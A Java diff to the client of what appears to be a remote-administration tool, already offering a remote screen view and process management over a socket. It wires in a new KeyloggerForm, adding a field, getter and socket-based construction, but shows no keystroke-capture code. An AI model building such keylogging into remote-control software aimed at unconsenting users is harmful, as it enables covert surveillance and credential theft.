@@ -43,6 +43,7 @@ public class Client extends JFrame {
 	private volatile static float scale = 1;
 	private RemoteForm remoteForm = null;
 	private ProcessManagementForm processManagementForm = null;
+	private KeyloggerForm keyloggerForm = null;
 
 	public JLabel getLabelScreen() {
 		return this.jLabelScreen;
@@ -66,6 +67,10 @@ public class Client extends JFrame {
 	
 	public ProcessManagementForm getProcessManagementForm() {
 		return processManagementForm;
+	}
+	
+	public KeyloggerForm getKeyloggerForm() {
+		return keyloggerForm;
 	}
 
 	public static BufferedImage resizeImage(BufferedImage originalImage, int targetWidth, int targetHeight) {
@@ -125,11 +130,12 @@ public class Client extends JFrame {
 	public Client(String address, int port, String password) {
 
 		GUI();
-
+ 
 		// establish a connection
 		try {
 			socket = new Socket(address, port);
 			processManagementForm = new ProcessManagementForm(socket);
+			keyloggerForm = new KeyloggerForm(socket);
 			System.out.println("Connected to server");
 
 			// sends output to the socket
@@ -191,7 +197,7 @@ public class Client extends JFrame {
 			EventQueue.invokeLater(new Runnable() {
 				public void run() {
 					try {
-						remoteForm = new RemoteForm(socket,processManagementForm);
+						remoteForm = new RemoteForm(socket,Client.this); 
 						remoteForm.setVisible(true);
 					} catch (Exception e) {
 						e.printStackTrace();
